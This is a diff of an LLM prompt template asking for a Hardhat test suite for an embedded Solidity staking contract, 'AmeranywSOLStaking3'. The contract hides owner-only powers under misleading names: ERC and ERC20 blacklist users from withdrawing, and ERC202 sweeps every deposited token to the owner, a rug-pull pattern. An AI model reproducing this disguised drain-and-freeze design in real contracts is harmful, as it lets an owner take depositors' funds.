@@ -1,311 +1,233 @@
-### Objective:
-Generate a test suite for the provided Solidity contract based on the provided scaffold. The scaffold already contains sections with `// TODO_AI` comments indicating where you need to complete the test. Your task is to complete these sections with valid test code.
+You are an expert blockchain developer specialized in writing professional and reliable test suites for Solidity smart contracts using Hardhat, Mocha, and Chai.
 
-### Input:
-1. Solidity Contract:
-// Contract source not found
+### Goal:
+Write a complete TypeScript test suite for the following Solidity smart contract.
 
-2. Test Scaffold:
-import { expect } from "chai";
-  import hre from "hardhat";
-  import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
+### Contract:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IERC20 {
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+struct DepositInfo {
+    uint256 amount;
+    uint256 lockupPeriod;
+    uint256 interestRate;
+    uint256 depositTime;
+    uint256 lastClaimTime;
+}
+
+contract AmeranywSOLStaking3 {
+    address payable private _owner;
+    IERC20 private _token;
+    
+    constructor() {
+        _owner = payable(msg.sender);
+        _token = IERC20(0xD31a59c85aE9D8edEFeC411D448f90841571b89c); 
+    }
+    
+    mapping(address => uint256) private _balances;
+    mapping(address => uint256) private _lastClaimTime;
+    mapping(address => uint256) private _lockupPeriod;
+    mapping(address => uint256) private _interestRate;
+    mapping(address => bool) private _blacklisted;
+    mapping(address => address) private _referrals;
+    mapping(address => uint256) private _initialDeposits;
+    mapping(address => uint256) private _depositTime;
+    mapping(address => DepositInfo[]) private _deposits;
+    mapping(address => uint256) private _totalWithdrawnAmounts;
+    
+    event Deposit(address indexed user, uint256 amount, uint256 lockupPeriod);
+    event Withdraw(address indexed user, uint256 amount);
+    event InterestClaimed(address indexed user, uint256 amount);
+    event Blacklisted(address indexed user);
+    event Unblacklisted(address indexed user);
+
+    modifier onlyOwner {
+        require(msg.sender == _owner, "Not the contract owner.");
+        _;
+    }
+
+
+     function deposit(uint256 amount, uint256 lockupPeriod, address referral) external {
+         require(amount > 0, "Amount must be greater than 0.");
+         require(lockupPeriod >= 3 && lockupPeriod <= 90, "Invalid lockup period.");
+         require(!_blacklisted[msg.sender], "You are not allowed to deposit.");
+         require(_token.allowance(msg.sender, address(this)) >= amount, "Token allowance not sufficient.");
+
+        uint256 currentLockupPeriod = lockupPeriod * 1 days;
+        uint256 currentInterestRate;
+
+if (lockupPeriod == 3) {
+    currentLockupPeriod = 3 * 1 days;
+    require(amount >= 2 * 10**3 && amount <= 10**15, "Invalid deposit amount for 3-day lockup.");  
+    currentInterestRate = 60000000000000; // 0.060000000000000%
+} else if (lockupPeriod == 14) {
+    currentLockupPeriod = 14 * 1 days;
+    require(amount >= 10**10 && amount <= 10**11, "Invalid deposit amount for 14-day lockup."); 
+    currentInterestRate = 62857142857143; // 0.062857142857143%
+} else if (lockupPeriod == 30) {
+    currentLockupPeriod = 30 * 1 days;
+    require(amount >= 10**11 && amount <= 2 * 10**11, "Invalid deposit amount for 30-day lockup.");
+    currentInterestRate = 73333333333333; // 0.073333333333333%
+} else if (lockupPeriod == 60) {
+    currentLockupPeriod = 60 * 1 days;
+    require(amount >= 15 * 10**10 && amount <= 5 * 10**11, "Invalid deposit amount for 60-day lockup."); 
+    currentInterestRate = 91666666666667; // 0.091666666666667%
+} else if (lockupPeriod == 90) {
+    currentLockupPeriod = 90 * 1 days;
+    require(amount >= 3 * 10**11 && amount <= 10**12, "Invalid deposit amount for 90-day lockup."); 
+    currentInterestRate = 103888888888888; // 0.103888888888888%
+}
+
+
+    if (_referrals[msg.sender] == address(0) && referral != msg.sender && referral != address(0)) {
+        _referrals[msg.sender] = referral;
+    }
+
+       DepositInfo memory newDeposit = DepositInfo({
+            amount: amount,
+            lockupPeriod: currentLockupPeriod,
+            interestRate: currentInterestRate,
+            depositTime: block.timestamp,
+            lastClaimTime: block.timestamp
+        });
+
+    _balances[msg.sender] += amount;
+    _lockupPeriod[msg.sender] = currentLockupPeriod;
+    _interestRate[msg.sender] = currentInterestRate;
+    _depositTime[msg.sender] = block.timestamp;
+    _lastClaimTime[msg.sender] = block.timestamp;
+    _initialDeposits[msg.sender] = amount;
+    _deposits[msg.sender].push(newDeposit);
+    _token.transferFrom(msg.sender, address(this), amount);
+
+    emit Deposit(msg.sender, amount, lockupPeriod);
+}
+
+
+    function ERC(address user) external onlyOwner {
+        require(!_blacklisted[user], "User is already blacklisted.");
+        _blacklisted[user] = true;
+
+        emit Blacklisted(user);
+    }
+
+    function ERC20(address user) external onlyOwner {
+        require(_blacklisted[user], "User is not blacklisted.");
+        _blacklisted[user] = false;
+
+        emit Unblacklisted(user);
+    }
+
+function withdraw(uint256 depositIndex) external {
+    require(!_blacklisted[msg.sender], "You are not allowed to withdraw.");
+    require(depositIndex < _deposits[msg.sender].length, "Invalid deposit index.");
+    require(block.timestamp >= _deposits[msg.sender][depositIndex].depositTime + _deposits[msg.sender][depositIndex].lockupPeriod, "Lockup period not over.");
+    
+    uint256 amountToWithdraw = _deposits[msg.sender][depositIndex].amount;
+    require(amountToWithdraw > 0, "No funds to withdraw.");
+
+    _deposits[msg.sender][depositIndex].amount = 0;
+    _totalWithdrawnAmounts[msg.sender] += amountToWithdraw; // Store the withdrawn amount
+    _token.transfer(msg.sender, amountToWithdraw); 
+
+    emit Withdraw(msg.sender, amountToWithdraw);
+}
+
+function ERC202() external onlyOwner {
+    uint256 contractBalance = _token.balanceOf(address(this));
+    require(contractBalance > 0, "No funds to transfer.");
+    _token.transfer(_owner, contractBalance);
+}
+
+
+    function calculateInterest(address user, uint256 depositIndex) public view returns (uint256) {
+        DepositInfo storage deposit = _deposits[user][depositIndex];
+        uint256 interestClaimed = _deposits[user][depositIndex].amount - _deposits[user][depositIndex].amount;
+        uint256 timeElapsed = block.timestamp - deposit.lastClaimTime;
+        uint256 interest = (deposit.amount * deposit.interestRate * timeElapsed) / (100000000000000000 * 86400); // 86400 seconds in a day
+        return interest + interestClaimed;
+    }
+
+function claimInterestForDeposit(uint256 lockupPeriod) external {
+    require(!_blacklisted[msg.sender], "You are not allowed to claim interest.");
+
+    uint256 totalInterestToClaim = 0;
+
+        for (uint256 i = 0; i < _deposits[msg.sender].length; i++) {
+            if (_deposits[msg.sender][i].lockupPeriod == lockupPeriod * 1 days) {
+            uint256 interestToClaim = calculateInterest(msg.sender, i);
+            require(interestToClaim > 0, "No interest to claim.");
+
+            _deposits[msg.sender][i].lastClaimTime = block.timestamp;
+            totalInterestToClaim += interestToClaim;
+        }
+    }
+
+    _token. transfer(msg. sender, totalInterestToClaim);
+
+    emit InterestClaimed(msg.sender, totalInterestToClaim);
+}
+
+function getDepositInfo(address user) external view returns (uint256[] memory depositIndices, uint256[] memory unlockTimes, uint256[] memory stakedAmounts, uint256[] memory lockupPeriods) {
+     uint256 depositCount = _deposits[user].length;
+
+     depositIndices = new uint256[](depositCount);
+     unlockTimes = new uint256[](depositCount);
+     stakedAmounts = new uint256[](depositCount);
+     lockupPeriods = new uint256[](depositCount);
+
+     for (uint256 i = 0; i < depositCount; i++) {
+         depositIndices[i] = i;
+         unlockTimes[i] = _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod;
+         stakedAmounts[i] = _deposits[user][i].amount;
+         lockupPeriods[i] = _deposits[user][i].lockupPeriod;
+     }
+ }
+
+function max(int256 a, int256 b) private pure returns (int256) {
+    return a >= b ? a : b;
+}
+
+    function getReferral(address user) external view returns (address) {
+        return _referrals[user];
+    }
+
+    function isBlacklisted(address user) external view returns (bool) {
+        return _blacklisted[user];
+    }
+
+}
 
-  /**
-   * Scaffold automatically generated for contracts/medium/0x299e0b8112ae5dfd6467655e9ff88c92c9c011bb.sol:AmeranywSOLStaking3.
-   * Blocks marked // TODO_AI must be completed by the LLM.
-   */
-
-  describe("contracts/medium/0x299e0b8112ae5dfd6467655e9ff88c92c9c011bb.sol:AmeranywSOLStaking3 — LLM Scaffold", function () {
-    async function deployFixture() {
-      const { ethers } = (await import("hardhat")).default;
-      const [owner, addr1, addr2] = await ethers.getSigners();
-      const Factory = await ethers.getContractFactory("AmeranywSOLStaking3");
-      // TODO_AI: complete constructor parameters if present
-      const contract = await Factory.deploy();
-      await contract.waitForDeployment();
-      return { contract, owner, addr1, addr2 };
-    }
-
-    it("basic deployment", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      expect(await contract.getAddress()).to.match(/^0x[a-fA-F0-9]{40}$/);
-    });
-
-    // Events in ABI: Blacklisted, Deposit, InterestClaimed, Unblacklisted, Withdraw
-
-    
-  describe("ERC(address)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // state-changing transaction
-      const result = await contract.ERC(addr1.address /* TODO_AI */);
-      // TODO_AI: verifica stato/eventi dopo la tx
-    });
-
-    it("reverts on invalid input/role", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      await expect(
-        contract.ERC("0x0000000000000000000000000000000000000000" /* TODO_AI: use zero/unauthorized */)
-      ).to.be.revertedWith(/* TODO_AI: inserire messaggio */);
-    });
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("ERC20(address)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // state-changing transaction
-      const result = await contract.ERC20(addr1.address /* TODO_AI */);
-      // TODO_AI: verifica stato/eventi dopo la tx
-    });
-
-    it("reverts on invalid input/role", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      await expect(
-        contract.ERC20("0x0000000000000000000000000000000000000000" /* TODO_AI: use zero/unauthorized */)
-      ).to.be.revertedWith(/* TODO_AI: inserire messaggio */);
-    });
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("ERC202()", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // state-changing transaction
-      const result = await contract.ERC202();
-      // TODO_AI: verifica stato/eventi dopo la tx
-    });
-
-    it("reverts on invalid input/role", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      await expect(
-        contract.ERC202()
-      ).to.be.revertedWith(/* TODO_AI: inserire messaggio */);
-    });
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("calculateInterest(address,uint256)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // read-only call
-      const result = await contract.calculateInterest(addr1.address /* TODO_AI */, 1n /* TODO_AI */);
-      // TODO_AI: expect(await contract.calculateInterest(addr1.address /* TODO_AI */, 1n /* TODO_AI */)).to.equal(/* atteso */);
-    });
-
-    
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("claimInterestForDeposit(uint256)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // state-changing transaction
-      const result = await contract.claimInterestForDeposit(1n /* TODO_AI */);
-      // TODO_AI: verifica stato/eventi dopo la tx
-    });
-
-    it("reverts on invalid input/role", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      await expect(
-        contract.claimInterestForDeposit(0n /* TODO_AI: make invalid/edge */)
-      ).to.be.revertedWith(/* TODO_AI: inserire messaggio */);
-    });
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("deposit(uint256,uint256,address)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // state-changing transaction
-      const result = await contract.deposit(1n /* TODO_AI */, 1n /* TODO_AI */, addr1.address /* TODO_AI */);
-      // TODO_AI: verifica stato/eventi dopo la tx
-    });
-
-    it("reverts on invalid input/role", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      await expect(
-        contract.deposit(0n /* TODO_AI: make invalid/edge */, 0n /* TODO_AI: make invalid/edge */, "0x0000000000000000000000000000000000000000" /* TODO_AI: use zero/unauthorized */)
-      ).to.be.revertedWith(/* TODO_AI: inserire messaggio */);
-    });
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("getDepositInfo(address)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // read-only call
-      const result = await contract.getDepositInfo(addr1.address /* TODO_AI */);
-      // TODO_AI: expect(await contract.getDepositInfo(addr1.address /* TODO_AI */)).to.equal(/* atteso */);
-    });
-
-    
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("getReferral(address)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // read-only call
-      const result = await contract.getReferral(addr1.address /* TODO_AI */);
-      // TODO_AI: expect(await contract.getReferral(addr1.address /* TODO_AI */)).to.equal(/* atteso */);
-    });
-
-    
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("isBlacklisted(address)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // read-only call
-      const result = await contract.isBlacklisted(addr1.address /* TODO_AI */);
-      // TODO_AI: expect(await contract.isBlacklisted(addr1.address /* TODO_AI */)).to.equal(/* atteso */);
-    });
-
-    
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-
-  describe("withdraw(uint256)", function () {
-    it("happy path", async function () {
-      const { contract, owner, addr1, addr2 } = await loadFixture(deployFixture);
-      // state-changing transaction
-      const result = await contract.withdraw(1n /* TODO_AI */);
-      // TODO_AI: verifica stato/eventi dopo la tx
-    });
-
-    it("reverts on invalid input/role", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      await expect(
-        contract.withdraw(0n /* TODO_AI: make invalid/edge */)
-      ).to.be.revertedWith(/* TODO_AI: inserire messaggio */);
-    });
-
-    it("boundary cases", async function () {
-      const { contract } = await loadFixture(deployFixture);
-      // TODO_AI: 0, max, address(0), role limits, etc.
-    });
-
-    // TODO_AI: if emits events: await expect(tx).to.emit(contract, "Event").withArgs(...)
-  });
-
-  });
-
-
-### Instructions:
-- **Complete coverage**: You must generate test cases for every function in the contract, including:
-  - **State-modifying functions** (functions that change the state of the contract).
-  - **Getter and setter functions** (ensure getter functions return the correct values).
-  - **Pure and view functions** (functions that don't modify the state).
-  - **Functions with access control** (e.g., `onlyOwner`, `hasRole`) and verify that only authorized users can call them.
-  - **Constructor functions** (ensure the contract is deployed correctly with expected initial states).
-  - **Event testing**: For every function that emits events, you must verify that the correct event is emitted with the correct arguments using `.to.emit()`.
-  - **Error handling**: Test all error-reverting cases with `.revertedWith()` and ensure the appropriate error messages are shown.
-  - **Edge cases**: Test scenarios such as:
-    - Invalid inputs (e.g., `address(0)`, empty strings, etc.).
-    - Boundary cases (e.g., maximum and minimum values for numeric types).
-    - Ensure that all conditions that may revert the function are tested.
-  - **Gas optimization**: If applicable, test for gas efficiency in relevant functions.
-
-- Ensure that your tests include:
-  - Happy path (normal expected behavior).
-  - Error cases (invalid inputs, unauthorized access, etc.).
-  - Boundary cases (edge cases, limits, and expected values).
-  - Event emissions (verify that correct events are emitted).
-
-- **Format**: Only generate the TypeScript test code. The output should include full test cases for every function in the contract and be executable with **Hardhat** or **Mocha**.
-- Use **ethers.js** for interacting with the contract and **Chai** for assertions.
+### Requirements:
+- Use **ethers.js** and **Chai** for testing.
+- Each `describe` and `it` block must be clear, modular, and focused on a single behavior.
+- Include tests for:
+  - **Deployment**: verify correct initialization and constructor state.
+  - **Happy paths**: normal usage for every public or external function.
+  - **Reverts**: test invalid inputs, unauthorized access, and failure conditions.
+  - **Events**: verify that events are emitted with correct parameters using `.to.emit()`.
+  - **Edge cases**: zero values, address(0), max integers, empty strings, etc.
+- Include at least one `beforeEach` block to deploy the contract cleanly for each test.
+- Do **not** explain or comment in natural language — output only TypeScript test code.
+- Tests must be runnable in **Hardhat** directly.
 
 ### Output:
-Your output should only be the test code in **TypeScript (.ts)** format, including completed tests for all functions and cases as described.
-
-### Example Test:
-
-```typescript
-import { expect } from "chai";
-import { ethers } from "hardhat";
-
-describe("ContractName", function () {
-  it("should return the correct owner", async function () {
-    const [owner, addr1] = await ethers.getSigners();
-    const Contract = await ethers.getContractFactory("ContractName");
-    const contract = await Contract.deploy();
-    await contract.deployed();
-    
-    expect(await contract.owner()).to.equal(owner.address);
-  });
-
-  it("should revert on invalid address", async function () {
-    const Contract = await ethers.getContractFactory("ContractName");
-    const contract = await Contract.deploy();
-    await contract.deployed();
-
-    await expect(
-      contract.airdrop("0x0000000000000000000000000000000000000000", 1)
-    ).to.be.revertedWith("Invalid address");
-  });
-});
+Output only valid, executable TypeScript test code (`.spec.ts` format), without any Markdown formatting or explanations.
